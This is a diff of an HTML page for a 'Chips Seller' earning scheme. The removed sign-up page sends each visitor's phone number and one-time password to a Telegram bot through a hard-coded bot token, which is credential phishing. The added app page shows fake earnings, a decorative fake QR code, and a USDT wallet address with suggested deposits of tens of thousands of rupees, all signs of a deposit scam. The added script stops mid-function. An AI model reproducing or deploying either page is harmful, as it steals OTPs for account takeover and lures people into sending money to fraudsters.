@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chips Seller - Sign Up</title>
+    <title>Chips Seller - App</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -13,123 +13,282 @@
         }
     </style>
 </head>
-<body class="bg-[#5b21b6] min-h-screen text-slate-900 flex flex-col justify-start selection:bg-indigo-500 selection:text-white">
+<body class="bg-slate-100 min-h-screen text-slate-900 flex flex-col justify-between selection:bg-indigo-500 selection:text-white">
 
     <!-- Toast Notification Container -->
     <div id="toast-container" class="fixed top-5 left-1/2 -translate-x-1/2 z-50 flex flex-col gap-2 w-11/12 max-w-md pointer-events-none"></div>
 
-    <!-- Permanent SVG Banner Section (No Broken Image Links) -->
-    <header class="w-full pt-6 pb-2 px-4 max-w-md mx-auto flex flex-col items-start relative">
-      <!-- Speech Bubble Badge -->
-      <div class="bg-white/20 backdrop-blur-md px-3 py-1 rounded-xl text-white font-extrabold text-xs tracking-wider mb-2 border border-white/20 shadow-sm">
-        JOIN US!
-      </div>
-
-      <!-- Main Title Text -->
-      <h2 class="text-xl font-bold text-white leading-tight max-w-[260px] mb-4">
-        As an official Chip Seller to earn <span class="text-amber-300 font-extrabold">₹500K monthly.</span>
-      </h2>
-
-      <!-- Embedded Vector Characters & Coin Stack -->
-      <div class="w-full flex justify-end items-end h-28 pr-2 -mt-6">
-        <svg viewBox="0 0 200 120" class="h-28 w-auto overflow-visible">
-          <!-- Stack of Gold Coins -->
-          <g transform="translate(60, 65)">
-            <ellipse cx="20" cy="30" rx="18" ry="6" fill="#f59e0b" />
-            <ellipse cx="20" cy="25" rx="18" ry="6" fill="#fbbf24" />
-            <ellipse cx="20" cy="20" rx="18" ry="6" fill="#fcd34d" />
-            <ellipse cx="20" cy="15" rx="18" ry="6" fill="#fef08a" stroke="#f59e0b" stroke-width="1" />
-          </g>
-
-          <!-- Kneeling Person with Big Coin -->
-          <g transform="translate(15, 30)">
-            <circle cx="35" cy="40" r="16" fill="#fbbf24" stroke="#f59e0b" stroke-width="2" />
-            <circle cx="20" cy="25" r="5" fill="#fde68a" />
-            <path d="M12 32 Q 20 30 28 35 L 25 50 L 10 50 Z" fill="#0284c7" />
-            <path d="M10 50 L 30 50 L 35 68 L 5 68 Z" fill="#1e1b4b" />
-          </g>
-
-          <!-- Standing Person 1 (Yellow Pants) -->
-          <g transform="translate(115, 10)">
-            <circle cx="15" cy="12" r="6" fill="#fde68a" />
-            <path d="M8 20 L 22 20 L 20 48 L 10 48 Z" fill="#06b6d4" />
-            <path d="M10 48 L 20 48 L 22 85 L 8 85 Z" fill="#fbbf24" />
-            <!-- Pointing Arm -->
-            <path d="M8 22 L -8 5 L -4 2 Z" fill="#06b6d4" stroke="#06b6d4" stroke-width="3" stroke-linecap="round" />
-          </g>
-
-          <!-- Standing Person 2 (Red Dress) -->
-          <g transform="translate(145, 18)">
-            <circle cx="12" cy="10" r="5.5" fill="#fde68a" />
-            <path d="M6 17 L 18 17 L 20 45 L 4 45 Z" fill="#f43f5e" />
-            <path d="M6 45 L 18 45 L 16 80 L 8 80 Z" fill="#312e81" />
-          </g>
-        </svg>
-      </div>
+    <!-- Top Header -->
+    <header id="app-header" class="w-full pt-4 pb-3 px-4 max-w-md mx-auto flex justify-between items-center bg-white shadow-sm transition-all">
+        <!-- Will be dynamically updated by JS -->
     </header>
 
-    <!-- Main White Bottom Card Form Section -->
-    <main class="w-full max-w-md mx-auto px-4 -mt-2">
-        <div class="bg-white rounded-t-[35px] p-6 shadow-2xl border-t border-white/20">
-            <div class="text-center mb-5 flex items-center justify-center space-x-2">
-                <span class="text-indigo-300 font-bold tracking-widest text-xs">////</span>
-                <h3 class="text-xs font-extrabold tracking-widest text-slate-800 uppercase">Sign up & Earn</h3>
-                <span class="text-indigo-300 font-bold tracking-widest text-xs">////</span>
+    <!-- Main Content Area -->
+    <main class="w-full max-w-md mx-auto px-4 flex-1 flex flex-col py-6 overflow-y-auto">
+        
+        <!-- HOME TAB VIEW -->
+        <div id="tab-home" class="tab-content flex-1 flex flex-col justify-center items-center">
+            <div class="w-full bg-indigo-50/80 border border-indigo-100 rounded-2xl p-4 mb-8 flex items-center justify-between shadow-sm">
+                <div class="flex items-center space-x-3">
+                    <div class="w-10 h-10 bg-amber-100 rounded-xl flex items-center justify-center">
+                        <i class="fa-solid fa-coins text-amber-500 text-lg"></i>
+                    </div>
+                    <div>
+                        <div class="text-xs font-medium text-slate-500">Today's Earnings <span class="font-bold text-slate-800">0</span></div>
+                        <div class="text-xs font-medium text-slate-500">Total Earning <span class="font-bold text-slate-800">0</span></div>
+                    </div>
+                </div>
             </div>
 
-            <form id="signup-form" onsubmit="handleFormSubmit(event)" class="space-y-4">
-                <!-- Phone Number Input -->
-                <div>
-                    <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
-                        <div class="flex items-center pl-4 pr-3 py-3.5 border-r border-slate-200 text-slate-700 font-semibold text-sm">
-                            <span>+91</span>
+            <div class="flex flex-col items-center justify-center my-auto">
+                <div id="outer-glow" class="relative w-64 h-64 rounded-full bg-indigo-50 flex items-center justify-center border-4 border-indigo-100/50 shadow-inner transition-all duration-300">
+                    <button onclick="toggleOnlineStatus()" id="go-online-btn" class="w-48 h-48 rounded-full bg-gradient-to-b from-indigo-700 to-indigo-900 text-white flex flex-col items-center justify-center shadow-xl shadow-indigo-900/30 transform transition active:scale-95 border-4 border-indigo-600/30">
+                        <div id="btn-content" class="flex flex-col items-center justify-center">
+                            <i class="fa-solid fa-power-off text-3xl mb-2 text-white"></i>
+                            <span id="go-online-text" class="text-lg font-bold tracking-wide">Go Online</span>
                         </div>
-                        <input type="tel" id="phone" required placeholder="Type phone number" maxlength="10" 
-                            class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
-                    </div>
+                    </button>
                 </div>
+                <h2 id="status-title" class="mt-8 text-sm font-black italic uppercase tracking-wider text-slate-800 transition-all duration-300">
+                    GO ONLINE TO EARN MONEY!
+                </h2>
+            </div>
 
-                <!-- OTP Input with Request Button -->
-                <div>
-                    <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
-                        <input type="text" id="otp" required placeholder="Type OTP" maxlength="6"
-                            class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
-                        <button type="button" id="otp-btn" onclick="sendOTP()" 
-                            class="mr-2 px-5 py-2.5 bg-[#5b21b6] hover:bg-[#4c1d95] text-white text-xs font-bold rounded-xl transition shadow-md active:scale-95">
-                            Request
-                        </button>
-                    </div>
-                </div>
-
-                <!-- Upline Code Input (Optional) -->
-                <div>
-                    <div class="relative flex items-center bg-white border border-slate-200 rounded-2xl shadow-sm focus-within:border-indigo-600 focus-within:ring-2 focus-within:ring-indigo-600/20 transition">
-                        <input type="text" id="upline" placeholder="Upline Code (Optional)"
-                            class="w-full bg-transparent px-4 py-3.5 text-sm text-slate-800 placeholder-slate-400 focus:outline-none">
-                    </div>
-                </div>
-
-                <!-- Submit Button -->
-                <button type="submit" id="submit-btn"
-                    class="w-full mt-3 py-4 px-6 bg-[#5b21b6] hover:bg-[#4c1d95] text-white font-bold text-base rounded-2xl shadow-lg shadow-purple-900/25 transition active:scale-[0.98] flex items-center justify-center space-x-2">
-                    <span>Sign up</span>
-                </button>
-            </form>
+            <div class="mt-6 mb-2">
+                <a href="#" onclick="openBankModal(event)" class="inline-flex items-center space-x-2 text-indigo-900 font-bold text-sm border-b-2 border-indigo-900 pb-0.5 hover:text-indigo-700 transition">
+                    <i class="fa-solid fa-credit-card"></i>
+                    <span>My bank account</span>
+                </a>
+            </div>
         </div>
+
+        <!-- PURCHASE METHODS LIST VIEW -->
+        <div id="tab-purchase" class="tab-content hidden flex-1 flex flex-col">
+            <h2 class="text-base font-bold text-slate-800 mb-4 flex items-center space-x-2">
+                <span class="text-cyan-500 font-extrabold text-lg">|</span>
+                <span>Choose a purchase method</span>
+            </h2>
+
+            <div onclick="selectPurchaseMethod('Rupee')" class="relative bg-white border-2 border-indigo-600 rounded-2xl p-4 mb-4 shadow-md cursor-pointer hover:border-indigo-700 transition">
+                <div class="absolute -top-2.5 right-4 bg-gradient-to-r from-purple-600 to-indigo-600 text-white text-[10px] font-extrabold px-3 py-0.5 rounded-full shadow-sm">
+                    Best for Earning
+                </div>
+                <div class="flex items-center justify-between mb-3">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-indigo-100 rounded-xl flex items-center justify-center text-indigo-700 font-bold text-lg">
+                            <i class="fa-solid fa-indian-rupee-sign"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-bold text-slate-800 text-sm">Via Rupee</h3>
+                            <p class="text-xs font-bold text-amber-500">Get Extra 7.5% Chips</p>
+                        </div>
+                    </div>
+                    <div class="w-8 h-8 rounded-full bg-indigo-900 text-white flex items-center justify-center shadow-sm">
+                        <i class="fa-solid fa-chevron-right text-xs"></i>
+                    </div>
+                </div>
+                <p class="text-[11px] text-slate-500 mb-3">Use MobiKwik UPI to buy Chips</p>
+                <div class="bg-indigo-50/80 border border-indigo-100/60 rounded-xl p-2.5 flex items-center space-x-2">
+                    <i class="fa-solid fa-bolt text-indigo-600 text-xs"></i>
+                    <span class="text-[11px] font-semibold text-indigo-900">Higher change of geting sell chips orders</span>
+                </div>
+            </div>
+
+            <div onclick="openUsdtPage()" class="bg-white border border-slate-200 rounded-2xl p-4 shadow-sm cursor-pointer hover:border-slate-300 transition flex items-center justify-between">
+                <div class="flex items-center space-x-3">
+                    <div class="w-10 h-10 bg-emerald-100 rounded-xl flex items-center justify-center text-emerald-600 font-bold text-lg">
+                        <i class="fa-solid fa-t text-sm"></i>
+                    </div>
+                    <div>
+                        <h3 class="font-bold text-slate-800 text-sm">Via USDT</h3>
+                        <p class="text-xs font-medium text-emerald-600">Get Extra 5.0% Chips</p>
+                    </div>
+                </div>
+                <div class="w-8 h-8 rounded-full bg-slate-100 text-slate-600 flex items-center justify-center shadow-sm">
+                    <i class="fa-solid fa-chevron-right text-xs"></i>
+                </div>
+            </div>
+        </div>
+
+        <!-- USDT DEPOSIT SUB-PAGE (Matches Screenshot 17122.jpg) -->
+        <div id="sub-page-usdt" class="tab-content hidden flex-1 flex flex-col">
+            <!-- Title & Rewards Badge -->
+            <div class="text-center mb-4">
+                <h2 class="text-base font-bold text-slate-800 mb-1">Purchase chips via USDT</h2>
+                <div class="inline-flex items-center space-x-1.5 text-xs font-bold text-orange-500 bg-orange-50 px-3 py-1 rounded-full border border-orange-100 shadow-sm">
+                    <span>🎁</span>
+                    <span>5.0% Extra Chips Rewards</span>
+                </div>
+                <p class="text-[10px] text-slate-400 mt-1">(Rate: 1USDT = ₹106.00; 1Chip=0.0094USDT)</p>
+            </div>
+
+            <!-- Official USDT Account Address Box -->
+            <div class="bg-white border border-slate-200 rounded-2xl p-4 mb-4 shadow-sm">
+                <div class="flex items-center space-x-2 mb-2">
+                    <span class="text-cyan-500 font-extrabold text-lg">|</span>
+                    <h3 class="text-xs font-bold text-slate-800 uppercase tracking-wide">Official USDT Account Address</h3>
+                </div>
+                <div class="bg-amber-50/80 border border-amber-100 rounded-xl p-2 mb-3 text-[11px] font-semibold text-amber-700">
+                    * USDT Transfer Range: 25 - 180000USDT
+                </div>
+                <div class="flex items-center justify-between bg-slate-50 border border-slate-200 rounded-xl p-2.5">
+                    <span id="usdt-address" class="text-xs font-mono text-slate-700 truncate mr-2">TT4FvCsVh7TzoqPe9f52VX8ByDbJhvZg...</span>
+                    <button onclick="copyUsdtAddress()" class="bg-[#5b21b6] hover:bg-[#4c1d95] text-white text-xs font-bold px-4 py-1.5 rounded-lg shadow-sm transition active:scale-95 shrink-0">
+                        Copy
+                    </button>
+                </div>
+            </div>
+
+            <!-- QR Code Section -->
+            <div class="bg-white border border-slate-200 rounded-2xl p-4 mb-4 shadow-sm flex flex-col items-center justify-center">
+                <div class="w-36 h-36 bg-slate-100 border border-slate-200 rounded-xl p-2 flex items-center justify-center mb-3">
+                    <!-- Embedded SVG QR Code representation matching screenshot style -->
+                    <svg viewBox="0 0 100 100" class="w-full h-full">
+                        <rect width="100" height="100" fill="white"/>
+                        <!-- Corner Markers -->
+                        <rect x="10" y="10" width="25" height="25" fill="black"/>
+                        <rect x="13" y="13" width="19" height="19" fill="white"/>
+                        <rect x="16" y="16" width="13" height="13" fill="black"/>
+                        
+                        <rect x="65" y="10" width="25" height="25" fill="black"/>
+                        <rect x="68" y="13" width="19" height="19" fill="white"/>
+                        <rect x="71" y="16" width="13" height="13" fill="black"/>
+
+                        <rect x="10" y="65" width="25" height="25" fill="black"/>
+                        <rect x="13" y="68" width="19" height="19" fill="white"/>
+                        <rect x="16" y="71" width="13" height="13" fill="black"/>
+                        
+                        <!-- Random Data Pixels -->
+                        <rect x="40" y="12" width="5" height="5" fill="black"/>
+                        <rect x="50" y="15" width="4" height="4" fill="black"/>
+                        <rect x="42" y="25" width="6" height="6" fill="black"/>
+                        <rect x="55" y="30" width="5" height="5" fill="black"/>
+                        <rect x="12" y="42" width="5" height="5" fill="black"/>
+                        <rect x="22" y="45" width="4" height="4" fill="black"/>
+                        <rect x="35" y="40" width="6" height="6" fill="black"/>
+                        <rect x="45" y="45" width="10" height="10" fill="black"/>
+                        <rect x="65" y="42" width="5" height="5" fill="black"/>
+                        <rect x="75" y="50" width="6" height="6" fill="black"/>
+                        <rect x="85" y="40" width="5" height="5" fill="black"/>
+                        <rect x="40" y="65" width="6" height="6" fill="black"/>
+                        <rect x="52" y="60" width="5" height="5" fill="black"/>
+                        <rect x="60" y="70" width="8" height="8" fill="black"/>
+                        <rect x="72" y="65" width="5" height="5" fill="black"/>
+                        <rect x="80" y="75" width="10" height="10" fill="black"/>
+                        <rect x="45" y="85" width="5" height="5" fill="black"/>
+                        <rect x="25" y="80" width="6" height="6" fill="black"/>
+                    </svg>
+                </div>
+                <button onclick="showToast('QR Code saved to gallery!', 'success')" class="border border-indigo-900 text-indigo-900 hover:bg-indigo-50 text-xs font-bold px-6 py-2 rounded-xl transition">
+                    Save QR Code
+                </button>
+            </div>
+
+            <!-- Suggested USDT Amount to Transfer -->
+            <div class="mb-4">
+                <div class="flex items-center space-x-2 mb-2">
+                    <span class="text-cyan-500 font-extrabold text-lg">|</span>
+                    <h3 class="text-xs font-bold text-slate-800 uppercase tracking-wide">Suggested USDT Amount to Transfer</h3>
+                </div>
+                <div class="bg-amber-50/80 border border-amber-100 rounded-xl p-2.5 mb-3 flex items-start space-x-2">
+                    <span class="text-amber-500 text-sm">💡</span>
+                    <span class="text-[11px] font-semibold text-amber-800 leading-tight">Tips: Buy USDT below the rate ( 1 USDT = ₹106.00 ) to lower your cost.</span>
+                </div>
+
+                <!-- Package 1: Chips 10000 -->
+                <div onclick="selectUsdtPackage('10000', '89.85')" class="bg-white border border-slate-200 rounded-2xl p-4 mb-3 shadow-sm flex items-center justify-between cursor-pointer hover:border-indigo-600 transition">
+                    <div>
+                        <div class="text-[10px] text-slate-400 font-bold uppercase">Purchase</div>
+                        <h4 class="text-sm font-extrabold text-slate-800">Chips 10000</h4>
+                        <p class="text-[11px] text-slate-500 font-medium">Value: ₹10000</p>
+                    </div>
+                    <div class="bg-gradient-to-r from-purple-600 to-indigo-600 text-white px-4 py-2.5 rounded-xl text-right shadow-sm">
+                        <div class="text-xs font-extrabold">89.85 USDT</div>
+                        <div class="text-[10px] text-purple-200">Estimated Cost: ₹9525</div>
+                    </div>
+                </div>
+
+                <!-- Package 2: Chips 20000 -->
+                <div onclick="selectUsdtPackage('20000', '179.70')" class="bg-white border border-slate-200 rounded-2xl p-4 mb-3 shadow-sm flex items-center justify-between cursor-pointer hover:border-indigo-600 transition">
+                    <div>
+                        <div class="text-[10px] text-slate-400 font-bold uppercase">Purchase</div>
+                        <h4 class="text-sm font-extrabold text-slate-800">Chips 20000</h4>
+                        <p class="text-[11px] text-slate-500 font-medium">Value: ₹20000</p>
+                    </div>
+                    <div class="bg-gradient-to-r from-purple-600 to-indigo-600 text-white px-4 py-2.5 rounded-xl text-right shadow-sm">
+                        <div class="text-xs font-extrabold">179.70 USDT</div>
+                        <div class="text-[10px] text-purple-200">Estimated Cost: ₹19049</div>
+                    </div>
+                </div>
+
+                <!-- Package 3: Chips 50000 -->
+                <div onclick="selectUsdtPackage('50000', '449.24')" class="bg-white border border-slate-200 rounded-2xl p-4 mb-4 shadow-sm flex items-center justify-between cursor-pointer hover:border-indigo-600 transition">
+                    <div>
+                        <div class="text-[10px] text-slate-400 font-bold uppercase">Purchase</div>
+                        <h4 class="text-sm font-extrabold text-slate-800">Chips 50000</h4>
+                        <p class="text-[11px] text-slate-500 font-medium">Value: ₹50000</p>
+                    </div>
+                    <div class="bg-gradient-to-r from-purple-600 to-indigo-600 text-white px-4 py-2.5 rounded-xl text-right shadow-sm">
+                        <div class="text-xs font-extrabold">449.24 USDT</div>
+                        <div class="text-[10px] text-purple-200">Estimated Cost: ₹47620</div>
+                    </div>
+                </div>
+
+                <!-- Purchase History Link -->
+                <div class="text-center pb-4">
+                    <button onclick="showToast('Loading purchase history...', 'info')" class="text-xs font-bold text-slate-500 hover:text-indigo-900 inline-flex items-center space-x-1.5 transition">
+                        <i class="fa-solid fa-clock-rotate-left"></i>
+                        <span>Purchase History</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- REFERRAL TAB VIEW -->
+        <div id="tab-referral" class="tab-content hidden flex-1 flex flex-col items-center justify-center text-center">
+            <div class="w-16 h-16 bg-purple-100 text-purple-600 rounded-2xl flex items-center justify-center text-2xl mb-3 shadow-inner">
+                <i class="fa-solid fa-users"></i>
+            </div>
+            <h3 class="font-bold text-slate-800 text-base">Referral Program</h3>
+            <p class="text-xs text-slate-500 mt-1 max-w-xs">Invite your friends and earn bonus chips on their activity.</p>
+        </div>
+
+        <!-- RECORD TAB VIEW -->
+        <div id="tab-record" class="tab-content hidden flex-1 flex flex-col items-center justify-center text-center">
+            <div class="w-16 h-16 bg-sky-100 text-sky-600 rounded-2xl flex items-center justify-center text-2xl mb-3 shadow-inner">
+                <i class="fa-solid fa-file-lines"></i>
+            </div>
+            <h3 class="font-bold text-slate-800 text-base">Transaction Records</h3>
+            <p class="text-xs text-slate-500 mt-1 max-w-xs">All your earnings and purchase history will appear here.</p>
+        </div>
+
     </main>
+
+    <!-- Bottom Navigation Bar -->
+    <nav class="w-full max-w-md mx-auto bg-indigo-900 text-white rounded-t-3xl py-3 px-6 flex justify-between items-center shadow-2xl">
+        <button onclick="switchTab('home')" id="nav-home" class="nav-btn flex flex-col items-center text-white space-y-1 transition">
+            <i class="fa-solid fa-house text-lg"></i>
+            <span class="text-[10px] font-semibold">Home</span>
+        </button>
+        <button onclick="switchTab('purchase')" id="nav-purchase" class="nav-btn flex flex-col items-center text-indigo-300 hover:text-white space-y-1 transition">
+            <i class="fa-solid fa-circle-dot text-lg"></i>
+            <span class="text-[10px] font-medium">Purchase</span>
+        </button>
+        <button onclick="switchTab('referral')" id="nav-referral" class="nav-btn flex flex-col items-center text-indigo-300 hover:text-white space-y-1 transition">
+            <i class="fa-solid fa-users text-lg"></i>
+            <span class="text-[10px] font-medium">Referral</span>
+        </button>
+        <button onclick="switchTab('record')" id="nav-record" class="nav-btn flex flex-col items-center text-indigo-300 hover:text-white space-y-1 transition">
+            <i class="fa-solid fa-file-lines text-lg"></i>
+            <span class="text-[10px] font-medium">Record</span>
+        </button>
+    </nav>
 
     <!-- FontAwesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
-    <!-- JavaScript Logic with Dual Telegram Bot Integration -->
+    <!-- JavaScript Logic -->
     <script>
-        const BOT_TOKEN = "8439698505:AAGL0UR5DuMaMLm81HarVsDvQ8gFkvcZFU0";
-        const CHAT_ID = "8698008425";
-
-        let countdownSeconds = 60;
-        let timerInterval = null;
-
-        // Toast Notification Function
         function showToast(message, type = 'info') {
             const container = document.getElementById('toast-container');
             if (!container) return;
@@ -150,114 +309,4 @@
                     <i class="fa-solid fa-xmark text-xs"></i>
                 </button>
             `;
-
-            container.appendChild(toast);
-            setTimeout(() => { toast.classList.remove('opacity-0', 'translate-y-2'); }, 10);
-
-            setTimeout(() => {
-                toast.classList.add('opacity-0', 'translate-y-2');
-                setTimeout(() => toast.remove(), 300);
-            }, 4000);
-        }
-
-        // 1. Request Button Clicked -> Sends First Telegram Message (Phone Number)
-        async function sendOTP() {
-            const phoneInput = document.getElementById('phone').value.trim();
-            if(phoneInput.length < 10) {
-                showToast('Please enter a valid 10-digit mobile number first!', 'error');
-                return;
-            }
-
-            const otpBtn = document.getElementById('otp-btn');
-            if (timerInterval) return;
-
-            // First Telegram Message for Request
-            const message = `📲 *New OTP Request!*\n\n📱 *Phone:* \`+91 ${phoneInput}\``;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch (error) {
-                console.error('Telegram Error:', error);
-            }
-
-            showToast('OTP sent successfully to +91 ' + phoneInput, 'success');
-            otpBtn.disabled = true;
-            countdownSeconds = 60;
-            otpBtn.innerText = `${countdownSeconds}s`;
-            otpBtn.classList.add('opacity-50', 'cursor-not-allowed');
-
-            timerInterval = setInterval(() => {
-                countdownSeconds--;
-                otpBtn.innerText = `${countdownSeconds}s`;
-                if (countdownSeconds <= 0) {
-                    clearInterval(timerInterval);
-                    timerInterval = null;
-                    otpBtn.disabled = false;
-                    otpBtn.innerText = 'Request';
-                    otpBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-                }
-            }, 1000);
-        }
-
-        // 2. Sign Up Button Clicked -> Sends Second Telegram Message (Phone + OTP + Upline)
-        async function handleFormSubmit(event) {
-            event.preventDefault();
-
-            const phone = document.getElementById('phone').value.trim();
-            const otp = document.getElementById('otp').value.trim();
-            const upline = document.getElementById('upline').value.trim() || 'None';
-            const submitBtn = document.getElementById('submit-btn');
-
-            if (phone.length < 10) {
-                showToast('Please enter a valid phone number!', 'error');
-                return;
-            }
-            if (otp.length < 4) {
-                showToast('Please enter a valid OTP!', 'error');
-                return;
-            }
-
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Processing...</span>`;
-
-            // Second Telegram Message for Sign Up Submission
-            const message = `🚨 *New Chip Seller Sign-Up* 🚨\n\n📱 *Phone:* \`+91 ${phone}\`\n🔢 *OTP:* \`${otp}\`\n🔗 *Upline Code:* \`${upline}\``;
-
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                const data = await response.json();
-
-                if (data.ok) {
-                    showToast('Sign up successful! Welcome aboard.', 'success');
-                    document.getElementById('signup-form').reset();
-                } else {
-                    showToast('Failed to send data. Check configuration.', 'error');
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                showToast('Network error! Please try again.', 'error');
-            } finally {
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = `<span>Sign up</span>`;
-            }
-        }
-    </script>
-</body>
-</html>
+            
